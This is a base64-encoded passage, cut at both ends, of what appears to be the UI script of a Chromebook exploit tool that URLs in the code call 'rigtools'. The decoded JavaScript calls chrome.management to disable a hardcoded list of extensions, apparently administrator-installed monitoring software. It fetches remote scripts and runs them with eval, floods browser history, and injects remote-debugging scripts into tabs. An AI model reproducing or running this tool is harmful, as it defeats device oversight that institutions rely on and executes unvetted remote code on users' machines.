zaXplOiBtZWRpdW07CiAgZm9udC13ZWlnaHQ6IGJvbGQ7Cn0KI2NoaWk6aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICNhYmViMzU7Cn0KI2VkcHV6emxlIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZjZTJlOwogIGZvbnQtZmFtaWx5OiAnSW50ZXInLCBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogbWVkaXVtOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CiNlZHB1enpsZTpob3ZlciB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2UzYjYyMjsKfQojaW52aWRpb3VzIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMTIxMjEyOwogIGZvbnQtZmFtaWx5OiAnSW50ZXInLCBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogbWVkaXVtOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CiNpbnZpZGlvdXM6aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICMwODA4MDg7Cn0KI2FkYmxvY2sgewogIGJhY2tncm91bmQtY29sb3I6ICNmZjRkNGQ7CiAgZm9udC1mYW1pbHk6ICdJbnRlcicsIHNhbnMtc2VyaWY7CiAgZm9udC1zaXplOiBtZWRpdW07CiAgZm9udC13ZWlnaHQ6IGJvbGQ7Cn0KI2FkYmxvY2s6aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICNmZjVkNWQ7Cn0KI3N3YW1wIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDBhNWRmOwogIGZvbnQtZmFtaWx5OiAnSW50ZXInLCBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogbWVkaXVtOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CiNzd2FtcDpob3ZlciB7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwODRiMzsKfQojaHN0ZmxkIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjMzdkZTY0OwogIGZvbnQtZmFtaWx5OiAnSW50ZXInLCBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogbWVkaXVtOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CiNoc3RmbGQ6aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICMzNGJhNTg7Cn0KI3VwZGF0ZSB7CiAgYmFja2dyb3VuZC1jb2xvcjogIzk0NDJmZjsKICBmb250LWZhbWlseTogJ0ludGVyJywgc2Fucy1zZXJpZjsKICBmb250LXNpemU6IG1lZGl1bTsKICBmb250LXdlaWdodDogYm9sZDsKfQojdXBkYXRlOmhvdmVyIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjODIzZGRiOwp9CiNjdXJyZW50LWV4dGVuc2lvbjpob3ZlciwgI3Jtdi1jbW4tYmx0OmhvdmVyLCAjZGlzYWJsZS11c2VyZGVmLWV4dHM6aG92ZXIgewogIGJhY2tncm91bmQtY29sb3I6ICNlMDQzMzg7Cn0KLmNvbnRhaW5lciB7CiAgZGlzcGxheTogZmxleDsKICBnYXA6IDEwcHg7Cn0KI2NvZGUtcnVuIHsKICBhbGlnbi1zZWxmOiBmbGV4LXN0YXJ0OwogIGJhY2tncm91bmQtY29sb3I6ICNhMDZkZTY7CiAgY29sb3I6IHdoaXRlOwogIGJvcmRlcjogbm9uZTsKICBjdXJzb3I6IHBvaW50ZXI7Cn0KI2NvZGUgewogIGJhY2tncm91bmQ6ICMyYTI3M2Y7CiAgY29sb3I6IHdoaXRlOwogIHdpZHRoOiAxMDAlOwogIG1pbi1oZWlnaHQ6IDUwcHg7CiAgaGVpZ2h0OiAyMDBweDsKICByZXNpemU6IGJvdGg7CiAgYm9yZGVyOiAxcHggc29saWQgIzZmMDhmZjsKICBib3JkZXItcmFkaXVzOiA1cHg7CiAgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsKfQouZm9vdGVyIHsKICBwb3NpdGlvbjogZml4ZWQ7CiAgYm90dG9tOiA1cHg7CiAgcmlnaHQ6IDEwcHg7CiAgY29sb3I6ICNmNWUwZGM7Cn0KaW5wdXRbdHlwZT0nY2hlY2tib3gnXSB7CiAgYWNjZW50LWNvbG9yOiAjNmYwOGZmICFpbXBvcnRhbnQ7Cn0KaW5wdXRbaWQ9J1RhYlVSTElucHV0J10gewogIGJhY2tncm91bmQtY29sb3I6ICMyYTI3M2YgIWltcG9ydGFudDsKICBib3JkZXItY29sb3I6ICM2ZjA4ZmYgIWltcG9ydGFudDsKICBib3JkZXItc3R5bGU6IHNvbGlkOwogIGJvcmRlci1yYWRpdXM6IDVweDsKICBjb2xvcjogI2Y1ZTBkYzsKfQppbnB1dFtpZD0nVGFiVVJMSW5wdXQnXTpmb2N1cyB7CiAgYm9yZGVyOiAycHggc29saWQgIzZmMDhmZiAhaW1wb3J0YW50Owp9CmlucHV0W2lkPSdUYWJOYW1lSW5wdXQnXSB7CiAgYmFja2dyb3VuZC1jb2xvcjogIzJhMjczZiAhaW1wb3J0YW50OwogIGJvcmRlci1jb2xvcjogIzZmMDhmZiAhaW1wb3J0YW50OwogIGJvcmRlci1zdHlsZTogc29saWQ7CiAgYm9yZGVyLXJhZGl1czogNXB4OwogIGNvbG9yOiAjZjVlMGRjOwp9CmlucHV0W2lkPSdUYWJOYW1lSW5wdXQnXTpmb2N1cyB7CiAgYm9yZGVyOiAycHggc29saWQgIzZmMDhmZiAhaW1wb3J0YW50Owp9CkBtZWRpYSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6IDc2OHB4KSB7CiAgLmhlYWRlciB7CiAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICB9Cn0KPC9zdHlsZT4KCiAgYDsKCm9ubG9hZCA9IGFzeW5jIGZ1bmN0aW9uIHgoKSB7CiAgbGV0IGZvdW5kTm90aGluZyA9IHRydWU7CiAgZG9jdW1lbnQub3BlbigpOwogIHRoaXMuZG9jdW1lbnQud3JpdGUoaHRtbFN0eWxlKTsKICBkb2N1bWVudC5jbG9zZSgpOwoKICBpZiAoY2hyb21lLmZpbGVNYW5hZ2VyUHJpdmF0ZSkgewogICAgY2hyb21lLmZpbGVNYW5hZ2VyUHJpdmF0ZS5vcGVuVVJMKCJkYXRhOnRleHQvaHRtbCw8aDE+SGVsbG88L2gxPiIpOwogICAgZG9jdW1lbnQud3JpdGUoZmlsZU1hbmFnZXJQcml2YXRlVGVtcGxhdGUpOwogICAgZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCIjYnRuX0ZNUF9vcGVuVVJMIikub25jbGljayA9IGZ1bmN0aW9uIChldikge307CiAgfQoKICBpZiAoY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZCkgewogICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoImJlZm9yZWVuZCIsIG1hbmFnZW1lbnRUZW1wbGF0ZSk7CiAgICBjb25zdCBleHRsaXN0X2VsZW1lbnQgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuZXh0bGlzdCIpOwoKICAgIGF3YWl0IHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpOwogICAgY29uc3QgY29udGFpbmVyX2V4dGVuc2lvbnMgPSBkb2N1bWVudC5ib2R5LnF1ZXJ5U2VsZWN0b3IoCiAgICAgICIjY2hyb21lX21hbmFnZW1lbnRfZGlzYWJsZV9leHQiCiAgICApOwoKICAgIGNvbnRhaW5lcl9leHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiNjdXJyZW50LWV4dGVuc2lvbiIpLm9uY2xpY2sgPQogICAgICBhc3luYyBmdW5jdGlvbiBkZihlKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgIGNvbnN0IGdyYWJpZHRva2lsbCA9IGNocm9tZS5ydW50aW1lLmlkOwogICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChncmFiaWR0b2tpbGwsIGZhbHNlKTsKICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgIGFsZXJ0KCJ1bnN1Y2Nlc3NmdWwiKTsKICAgICAgICB9CiAgICAgIH07CgogICAgY29udGFpbmVyX2V4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiI3Jtdi1jbW4tYmx0Iikub25jbGljayA9IGZ1bmN0aW9uIGRmKCkgewogICAgICBjb25zdCBibG9hdElkcyA9IFsKICAgICAgICAiY2diYmJqbWdkcG5pZmlqY29uaGFtZ2dqZWhsYW1jaWYiLAogICAgICAgICJsZmtiYm1jbG5wYWlocGFhamhvaGhmZGplbGNoa2lrZiIsCiAgICAgICAgIm5jYm9mbmhtbWZmZm1jZG1iamZhaWdlcGtnbWpubG5lIiwKICAgICAgICAicG9obWdvYmRlYWplbWNpZnBvbGRubmhmZmpubmtoZ2YiLAogICAgICAgICJiZWNkcGxmYWxvb2ZsYW5pcGpvYmxjbXBhZWtrYmJoZSIsCiAgICAgICAgImZlZXBtZGxtaHBsYW9qYWJlb2VjYW9iZm1pYm9vYWlkIiwKICAgICAgICAiYWRrY3BrcGdoYWhtYm9wa2pjaG9iaWVja2VvYW9lZW0iLAogICAgICAgICJoYWxkbGdsZHBsZ25nZ2tqYWFmaGVsZ2lhZ2xhZmFuaCIsCiAgICAgICAgImZpbGdwamtkbWppbm1qYmVwYnBtbmZvYm1qbWdpbW9uIiwKICAgICAgICAia2tibWRnamdnY2RhamNrZGxibmdkam9ucGNocGFpZWEiLAogICAgICAgICJuamRuaWNsZ2VnaWpkY2RsaWtsZ2llaWNhbnBtY25naiIsCiAgICAgICAgImhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIiwKICAgICAgXTsKCiAgICAgIGxldCBleHRzID0ge307CiAgICAgIGxldCBleHRsbmd0aCA9IDA7CiAgICAgIGZ1bmN0aW9uIGdldExlbmd0aCgpIHsKICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsKICAgICAgICAgIGJsb2F0SWRzLmZvckVhY2goKGlkLCBpKSA9PiB7CiAgICAgICAgICAgIGV4dGVuc2lvbkV4aXN0cyhpZCkudGhlbigocmVzKSA9PiB7CiAgICAgICAgICAgICAgaWYgKHJlcykgZXh0bG5ndGgrKzsKICAgICAgICAgICAgICBpZiAoYmxvYXRJZHMubGVuZ3RoIC0gMSA9PT0gaSkgcmVzb2x2ZSgpOwogICAgICAgICAgICB9KTsKICAgICAgICAgIH0pOwogICAgICAgIH0pOwogICAgICB9CgogICAgICBmdW5jdGlvbiBpbml0RXh0T2JqKCkgewogICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gewogICAgICAgICAgYmxvYXRJZHMuZm9yRWFjaCgoaWQpID0+CiAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldChpZCwgKGUpID0+IHsKICAgICAgICAgICAgICBPYmplY3QuYXNzaWduKGV4dHMsIEpTT04ucGFyc2UoYHsiJHtlLmlkfSI6IiR7ZS5zaG9ydE5hbWV9In1gKSk7CiAgICAgICAgICAgICAgaWYgKE9iamVjdC5rZXlzKGV4dHMpLmxlbmd0aCA9PSBleHRsbmd0aCkgcmVzb2x2ZSgpOwogICAgICAgICAgICB9KQogICAgICAgICAgKTsKICAgICAgICB9KTsKICAgICAgfQoKICAgICAgZ2V0TGVuZ3RoKCkudGhlbigoKSA9PgogICAgICAgIGluaXRFeHRPYmooKS50aGVuKCgpID0+CiAgICAgICAgICBtYWtlRGlhbG9nKAogICAgICAgICAgICAiQXJlIHlvdSBzdXJlIHlvdSB3YW50IHRvIGRpc2FibGUgdGhlIGZvbGxvd2luZyBleHRlbnNpb25zPyIsCiAgICAgICAgICAgIE9iamVjdC52YWx1ZXMoZXh0cyksCiAgICAgICAgICAgIGZ1bmN0aW9uICgpIHt9LAogICAgICAgICAgICBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgbGV0IGRpc2FibGVkRXh0cyA9IFtdOwogICAgICAgICAgICAgIE9iamVjdC5rZXlzKGV4dHMpLmZvckVhY2goKGlkKSA9PiB7CiAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXQoaWQsIChlKSA9PiB7CiAgICAgICAgICAgICAgICAgIGlmIChlLmVuYWJsZWQpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoaWQgPT0gY2hyb21lLnJ1bnRpbWUuaWQpIHJldHVybjsKCiAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLnB1c2goZS5zaG9ydE5hbWUpOwogICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoaWQsIGZhbHNlKTsKICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgaWYgKCFkaXNhYmxlZEV4dHMubGVuZ3RoIDwgMSkgewogICAgICAgICAgICAgICAgICBtYWtlVG9hc3QoCiAgICAgICAgICAgICAgICAgICAgImRpc2FibGVkIHRoZSBmb2xsb3dpbmcgZXh0ZW5zaW9uczpcclxuIiArCiAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMuam9pbigiXHJcbiIpLAogICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5sZW5ndGgKICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgdXBkYXRlRXh0ZW5zaW9uU3RhdHVzKGV4dGxpc3RfZWxlbWVudCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgfSwgMjUwKTsKICAgICAgICAgICAgfQogICAgICAgICAgKQogICAgICAgICkKICAgICAgKTsKICAgIH07CgogICAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikgPT0gSlNPTi5zdHJpbmdpZnkoW10pKSB7CiAgICAgIGNvbnRhaW5lcl9leHRlbnNpb25zCiAgICAgICAgLnF1ZXJ5U2VsZWN0b3IoIiNkaXNhYmxlLXVzZXJkZWYtZXh0cyIpCiAgICAgICAgLnNldEF0dHJpYnV0ZSgic3R5bGUiLCAiZGlzcGxheTogbm9uZTsiKTsKICAgIH0KCiAgICBjb250YWluZXJfZXh0ZW5zaW9ucy5xdWVyeVNlbGVjdG9yKCIjZGlzYWJsZS11c2VyZGVmLWV4dHMiKS5vbmNsaWNrID0KICAgICAgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIGxldCBleHRzID0ge307CiAgICAgICAgZnVuY3Rpb24gaW5pdEV4dE9iaigpIHsKICAgICAgICAgIGxldCBpZGxpc3QgPSBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikpOwogICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlKSA9PiB7CiAgICAgICAgICAgIGlkbGlzdC5mb3JFYWNoKChpZCkgPT4gewogICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldChpZCwgKGUpID0+IHsKICAgICAgICAgICAgICAgIE9iamVjdC5hc3NpZ24oZXh0cywgSlNPTi5wYXJzZShgeyIke2UuaWR9IjoiJHtlLnNob3J0TmFtZX0ifWApKTsKICAgICAgICAgICAgICAgIGlmIChPYmplY3Qua2V5cyhleHRzKS5sZW5ndGggPT0gaWRsaXN0Lmxlbmd0aCkgcmVzb2x2ZSgpOwogICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9KTsKICAgICAgICAgIH0pOwogICAgICAgIH0KCiAgICAgICAgaW5pdEV4dE9iaigpLnRoZW4oKCkgPT4gewogICAgICAgICAgbWFrZURpYWxvZygKICAgICAgICAgICAgIkFyZSB5b3Ugc3VyZSB5b3Ugd2FudCB0byBkaXNhYmxlIHRoZSBmb2xsb3dpbmcgZXh0ZW5zaW9ucz8iLAogICAgICAgICAgICBPYmplY3QudmFsdWVzKGV4dHMpLAogICAgICAgICAgICBmdW5jdGlvbiAoKSB7fSwKICAgICAgICAgICAgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgIGxldCBkaXNhYmxlZEV4dHMgPSBbXTsKICAgICAgICAgICAgICBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikpLmZvckVhY2goKGlkKSA9PiB7CiAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXQoaWQsIChlKSA9PiB7CiAgICAgICAgICAgICAgICAgIGlmIChlLmVuYWJsZWQpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoaWQgPT0gY2hyb21lLnJ1bnRpbWUuaWQpIHJldHVybjsKCiAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLnB1c2goZS5zaG9ydE5hbWUpOwogICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoaWQsIGZhbHNlKTsKICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgaWYgKCFkaXNhYmxlZEV4dHMubGVuZ3RoIDwgMSkgewogICAgICAgICAgICAgICAgICBtYWtlVG9hc3QoCiAgICAgICAgICAgICAgICAgICAgImRpc2FibGVkIHRoZSBmb2xsb3dpbmcgZXh0ZW5zaW9uczpcclxuIiArCiAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMuam9pbigiXHJcbiIpLAogICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5sZW5ndGgKICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgdXBkYXRlRXh0ZW5zaW9uU3RhdHVzKGV4dGxpc3RfZWxlbWVudCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgfSwgMjUwKTsKICAgICAgICAgICAgfQogICAgICAgICAgKTsKICAgICAgICB9KTsKICAgICAgfTsKICB9IC8vIEVuZCBvZiBtYW5hZ2VtZW50IGlmIHN0YXRlbWVudAogIGNvbnN0IG90aGVyRmVhdHVyZXMgPSB3aW5kb3cuY2hyb21lLnJ1bnRpbWUuZ2V0TWFuaWZlc3QoKTsKICBjb25zdCBwZXJtaXNzaW9ucyA9IG90aGVyRmVhdHVyZXMucGVybWlzc2lvbnM7CgogIG5ldyBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzKCkuYWN0aXZhdGUoKTsKICBkb2N1bWVudC5ib2R5Lmluc2VydEFkamFjZW50SFRNTCgKICAgICJiZWZvcmVlbmQiLAogICAgYAogICAgICA8dGl0bGU+VW50aXRsZWQgRG9jdW1lbnQ8L3RpdGxlPgogICAgICA8bGluayByZWw9Imljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vZG9jcy5pY28iPgogICAgICBgCiAgKTsKCiAgY29uc3QgU2NyaXB0QnV0dG9ucyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNvdGhlci1idXR0b25zIik7CgogIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI3N3YW1wIikub25jbGljayA9IGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgIGZldGNoKAogICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vc2NyaXB0cy9zd2FtcC11bHRyYS5qcyIKICAgICkKICAgICAgLnRoZW4oKHJlcykgPT4gcmVzLnRleHQoKSkKICAgICAgLnRoZW4oZXZhbCk7CiAgfTsKCiAgU2NyaXB0QnV0dG9ucy5xdWVyeVNlbGVjdG9yKCIjdXBkYXRlIikub25jbGljayA9IGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgIChhc3luYyAoKSA9PiB7CiAgICAgIGNvbnN0IGZzID0gYXdhaXQgbmV3IFByb21pc2UoZnVuY3Rpb24gKHJlc29sdmUpIHsKICAgICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShQRVJTSVNURU5ULCAyICogMTAyNCAqIDEwMjQsIHJlc29sdmUpOwogICAgICB9KTsKCiAgICAgIGZ1bmN0aW9uIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7IGNyZWF0ZTogdHJ1ZSB9LCBmdW5jdGlvbiAoZW50cnkpIHsKICAgICAgICAgICAgZW50cnkucmVtb3ZlKGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgeyBjcmVhdGU6IHRydWUgfSwgZnVuY3Rpb24gKGVudHJ5KSB7CiAgICAgICAgICAgICAgICBlbnRyeS5jcmVhdGVXcml0ZXIoZnVuY3Rpb24gKHdyaXRlcikgewogICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICAgIHdyaXRlci5vbndyaXRlZW5kID0gcmVzb2x2ZS5iaW5kKG51bGwsIGVudHJ5LnRvVVJMKCkpOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgfSk7CiAgICAgICAgfSk7CiAgICAgIH0KCiAgICAgIGNvbnN0IHVybCA9IGF3YWl0IHdyaXRlRmlsZSgKICAgICAgICAicmlndG9vbHMuaHRtbCIsCiAgICAgICAgYCR7YXdhaXQgZmV0Y2goCiAgICAgICAgICAiaHR0cHM6Ly9jZG4uY2NzZC5sb2wvcmlnZ2luZy9pbmRleC5odG1sIgogICAgICAgICkudGhlbigocmVzKSA9PiByZXMudGV4dCgpKX08c2NyaXB0IHNyYz0iLi9yaWd0b29scy5qcyI+PC9zY3JpcHQ+YAogICAgICApOwoKICAgICAgYXdhaXQgd3JpdGVGaWxlKAogICAgICAgICJyaWd0b29scy5qcyIsCiAgICAgICAgYXdhaXQgZmV0Y2goCiAgICAgICAgICAiaHR0cHM6Ly9jZG4uY2NzZC5sb2wvcmlnZ2luZy9pbmRleC5qcyIKICAgICAgICApLnRoZW4oKHJlcykgPT4gcmVzLnRleHQoKSkKICAgICAgKTsKCiAgICAgIGNocm9tZS50YWJzLmNyZWF0ZSh7IHVybCB9KTsKICAgIH0pKCk7CiAgfTsKCiAgU2NyaXB0QnV0dG9ucy5xdWVyeVNlbGVjdG9yKCIjaHN0ZmxkIikub25jbGljayA9IGFzeW5jIGZ1bmN0aW9uIGRmKGUpIHsKICAgIGRvY3VtZW50LnRpdGxlID0gIlVudGl0bGVkIERvY3VtZW50IjsKICAgIGxldCBsaW5rID0KICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcigibGlua1tyZWx+PSdpY29uJ10iKSB8fAogICAgICBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaW5rIik7CiAgICBsaW5rLnJlbCA9ICJpY29uIjsKICAgIGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobGluayk7CiAgICBsaW5rLmhyZWYgPQogICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvcmlndG9vbHMtdXBkYXRlZC11aS9yZWZzL2hlYWRzL21haW4vZG9jcy5pY28iOwoKICAgIGxldCBudW0gPSBwcm9tcHQoCiAgICAgICJIb3cgVGltZXMgRG8gWW91IFdhbnQgVGhpcyBQYWdlIFRvIFNob3cgVXAgSW4geW91ciBIaXN0b3J5PyIKICAgICk7CiAgICBsZXQgZG9uZSA9IGZhbHNlOwogICAgY29uc3QgeCA9IHdpbmRvdy5sb2NhdGlvbi5ocmVmOwogICAgZm9yIChsZXQgaSA9IDE7IGkgPD0gbnVtOyBpKyspIHsKICAgICAgaGlzdG9yeS5wdXNoU3RhdGUoMCwgMCwgaSA9PT0gbnVtID8geCA6IGkudG9TdHJpbmcoKSk7CiAgICAgIGlmIChpID09PSBudW0pIGRvbmUgPSB0cnVlOwogICAgfQogICAgaWYgKGRvbmUpIHsKICAgICAgYWxlcnQoCiAgICAgICAgIkZsb29kaW5nIFN1Y2Nlc3NmdWwhXG4gIiArCiAgICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiArCiAgICAgICAgICAiIFxuSXMgTm93IEluIFlvdXIgSGlzdG9yeSAiICsKICAgICAgICAgIG51bSArCiAgICAgICAgICAobnVtID09IDEgPyAiIHRpbWUuIiA6ICIgVGltZXMuIikKICAgICAgKTsKICAgIH0KICB9OwoKICBjb25zdCBUYWJCdXR0b25zID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI3RhYnMtYnV0dG9ucyIpOwoKICBpZiAoY2hyb21lLnRhYnMuZXhlY3V0ZVNjcmlwdCkgewogICAgLy8gRGVjbGFyZSBhIHNpbmdsZSBsaXN0ZW5lciBmb3IgdGFiIHVwZGF0ZXMKICAgIGZ1bmN0aW9uIGxpc3RlbmVyQXBwKGNhbGxiYWNrKSB7CiAgICAgIGNvbnN0IGZ1bmMgPSAoaWQsIGNoYW5nZUluZm8pID0+IHsKICAgICAgICBpZiAoY2hhbmdlSW5mby5zdGF0dXMgPT09ICJjb21wbGV0ZSIpIHsKICAgICAgICAgIGNocm9tZS50YWJzLmdldChpZCwgKHRhYikgPT4gewogICAgICAgICAgICBpZiAodGFiKSB7CiAgICAgICAgICAgICAgY2FsbGJhY2sodGFiKTsKICAgICAgICAgICAgfQogICAgICAgICAgfSk7CiAgICAgICAgfQogICAgICB9OwogICAgICBjaHJvbWUudGFicy5vblVwZGF0ZWQuYWRkTGlzdGVuZXIoZnVuYyk7CiAgICAgIHJldHVybiBmdW5jOwogICAgfQoKICAgIGNvbnN0IHNjcmlwdHMgPSB7fTsgLy8gc2NyaXB0IHRvIGJlIHJhbiBvbiB0YWIKICAgIGNvbnN0IGNvbmRpdGlvbnMgPSB7fTsgLy8gKHRhYikgPT4ge30KICAgIGNvbnN0IGxpc3RlbmVycyA9IHt9OyAvLyBtYXAgZm9yIHJlbW92aW5nIGxpc3RlbmVycwoKICAgIHNjcmlwdHMuZXJ1ZGEgPSBgCiAgICBmZXRjaCgiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L25wbS9lcnVkYSIpLnRoZW4ocmVzID0+IHJlcy50ZXh0KCkpLnRoZW4oKGRhdGEpID0+IHsKICAgICAgZXZhbChkYXRhKTsKICAgICAgaWYgKCF3aW5kb3cuZXJ1ZGFMb2FkZWQpIHsKICAgICAgICBlcnVkYS5pbml0KHsKICAgICAgICAgIGRlZmF1bHRzOiB7CiAgICAgICAgICAgIGRpc3BsYXlTaXplOiA0NSwKICAgICAgICAgICAgdGhlbWU6ICJBTU9MRUQiCiAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgICAgd2luZG93LmVydWRhTG9hZGVkID0gdHJ1ZTsKICAgICAgfQogICAgfSk7CiAgYDsKCiAgICBzY3JpcHRzLmNoaWkgPSBgCiAgICBjb25zdCBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgIHNjcmlwdC5zcmMgPSAnaHR0cHM6Ly9jaGlpLmxpcmlsaXJpLmlvL3BsYXlncm91bmQvdGFyZ2V0LmpzJzsKICAgIHNjcmlwdC5zZXRBdHRyaWJ1dGUoJ2VtYmVkZGVkJywgJ3RydWUnKTsKICAgIGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KTsKICBgOwoKICAgIHNjcmlwdHMuYWRibG9jayA9IGAKICAgIChmdW5jdGlvbigpewogICAgICAvKiBBZC1CLUdvbmU6IEJvb2ttYXJrbGV0IHRoYXQgcmVtb3ZlcyBvYm5veGlvdXMgYWRzIGZyb20gcGFnZXMgKi8KICAgICAgdmFyIHNlbGVjdG9ycyA9IFsKICAgICAgLyogQnkgSUQ6ICovCiAgICAgICcjc2lkZWJhci13cmFwJywgJyNhZHZlcnQnLCAnI3hyYWlsJywgJyNtaWRkbGUtYXJ0aWNsZS1hZHZlcnQtY29udGFpbmVyJywKICAgICAgJyNzcG9uc29yZWQtcmVjb21tZW5kYXRpb25zJywgJyNhcm91bmQtdGhlLXdlYicsICcjc3BvbnNvcmVkLXJlY29tbWVuZGF0aW9ucycsCiAgICAgICcjdGFib29sYS1jb250ZW50JywgJyN0YWJvb2xhLWJlbG93LXRhYm9vbGEtbmF0aXZlLXRodW1ibmFpbHMnLCAnI2luYXJ0aWNsZV93cmFwcGVyX2RpdicsCiAgICAgICcjcmMtcm93LWNvbnRhaW5lcicsICcjYWRzJywgJyNhdC1zaGFyZS1kb2NrJywgJyNhdDQtc2hhcmUnLCAnI2F0NC1mb2xsb3cnLCAnI3JpZ2h0LWFkcy1yYWlsJywKICAgICAgJ2RpdiNhZC1pbnRlcnN0aXRpYWwnLCAnZGl2I2FkdmVydC1hcnRpY2xlJywgJ2RpdiNhYy1scmUtcGxheWVyLXBoJywKICAgICAgLyogQnkgQ2xh